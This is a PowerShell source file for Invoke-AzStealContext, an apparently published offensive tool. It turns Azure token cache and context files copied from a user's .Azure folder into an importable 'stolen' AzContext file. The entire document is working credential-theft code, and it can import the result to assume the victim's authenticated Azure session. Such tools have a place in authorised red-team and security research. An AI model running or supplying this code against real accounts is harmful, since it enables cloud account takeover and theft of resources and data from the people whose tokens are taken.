Function Invoke-AzStealContext {
    <#
    .SYNOPSIS
        A PowerShell function that automates the process of stealing the Azure context of a users .Azure folder.
    .DESCRIPTION
        When a user uses the Az PowerShell module a .Azure folder is created in the users home folder. 
        This folder contains multiple files including the AzureRmContext.json and TokenCache.dat files. 
        If a user has authenticated using the Connect-AzAccount cmdlet these files contain all the information a attacker needs to create a 'AzContext' file which is equivalent of the output from the Save-AzContext cmdlet. 
        This PowerShell function automates the process a attacker would need to take to create a 'AzContext' file.
    .PARAMETER Path
        The folder containing the borrowed 'TokenCache.dat' and 'AzureRmContext.json' files.
    .PARAMETER OutFile
        The AzContext file name to create from the 'TokenCache.dat' and 'AzureRmContext.json' files.
    .PARAMETER ImportContext
        If the function should automatically imported the created AzContext file.
    .PARAMETER Force
        Overwrites a exsisting AzContext file.
    .LINK
        https://github.com/justin-p/AzStealContext
    .EXAMPLE
        # Create a AzContext file 
        PS C:\> Invoke-AzStealContext -Path 'Path\To\Borrowed\Files'
    .EXAMPLE
        # Create a AzContext file and import it
        PS C:\> Invoke-AzStealContext -Path 'Path\To\Borrowed\Files' -ImportContext
    .EXAMPLE
        # Overwrite a exising AzContext file
        PS C:\> Invoke-AzStealContext -Path 'Path\To\Borrowed\Files' -ImportContext -Force 
    .NOTES
        Author: Justin Perdok (@JustinPerdok)
        License: MIT
        Project: https://github.com/justin-p/AzStealContext
    #>
    [cmdletbinding()]
    Param (
        [String]$Path,
        [String]$OutFile = 'StolenContext.json',
        [switch]$ImportContext,
        [Switch]$Force
    )
    Begin {
        Try {
            If (!(Test-Path $(Join-Path $Path "TokenCache.dat"))) {
                Write-Error "Unable to find `'TokenCache.dat`'-file in folder: $path" -ErrorAction Stop
            }
            If (!(Test-Path $(Join-Path $Path "AzureRmContext.json"))) {
                Write-Error "Unable to find `'AzureRmContext.json`'-file in folder: $path" -ErrorAction Stop
            }
            If (!($force)) {
                If (Test-Path $(Join-Path $Path $OutFile)) {
                    Write-Error "The AzContext file `'$(Join-Path $Path $OutFile)`' already exists" -ErrorAction Stop
                }
            }
            If ($ImportContext) {
                If ($null -eq $(Get-Module -ListAvailable -Name Az.Accounts)) {
                    Write-Error "Can not find the Az.Accounts PowerShell Module. This could mean that the Az PowerShell Module is not installed on the system. Run `'Install-Module Az`' to install the Az PowerShell Module." -ErrorAction Stop
                }
                Else {
                    Import-Module Az
                }
            }
        }
        Catch {
            $PSCmdlet.ThrowTerminatingError($PSItem)
        }     
    }
    Process {
        Try {
            If ($PSVersionTable.PSVersion.Major -eq 5) {
                $bytes = Get-Content $(Join-Path $Path "TokenCache.dat") -Encoding Byte
            } ElseIf ($PSVersionTable.PSVersion.Major -gt 5) {
                $bytes = Get-Content $(Join-Path $Path "TokenCache.dat") -AsByteStream
            }
            $b64 = [Convert]::ToBase64String($bytes)
            $AzureRmContext = Get-Content $(Join-Path $Path "AzureRmContext.json") | ConvertFrom-Json
            If (($AzureRmContext.contexts.PSObject.Properties.Name).count -gt 1) {
                $Contexts = $AzureRmContext.contexts.PSObject.Properties.Name
                do { 
                    Write-Host "Detected multiple contexts in `'$(Join-Path $Path "AzureRmContext.json")`'."
                    $index = 1
                    foreach ($Context in $Contexts) {
                        Write-Host "[$index] $($Context)"
                        $index++
                    }   
                    $selection = Read-Host "Select the context to use as default context."
                } until ($Contexts[[int]$selection-1])
                $DefaultContext = $Contexts[$selection-1]
                $AzureRmContext.DefaultContextKey = $DefaultContext
            }
            ForEach ($context in $AzureRmContext.contexts.PSObject.Properties.Name) {
                $AzureRmContext.Contexts.$($context).TokenCache.CacheData = $b64
            }
        } Catch {
            $PSCmdlet.ThrowTerminatingError($PSItem)
        }
    }
    End {
        Try {
            $AzureRmContext | ConvertTo-Json -Depth 100 | Set-Content $(Join-Path $Path $OutFile)
            If ($ImportContext) {
                [void](Import-AzContext -Profile $(Join-Path $Path $OutFile))
                Write-Host "Imported stolen AzContext file."
                $((Get-AzContext).Account | Format-Table -AutoSize ID, Type, ExtendedProperties)
            }
            Else {
                Write-Host "Created stolen AzContext file. Run `'Import-AzContext -Profile $(Join-Path $Path $OutFile)`' to import the AzContext."
            }
        } Catch {
            $PSCmdlet.ThrowTerminatingError($PSItem)
        }
    }
}
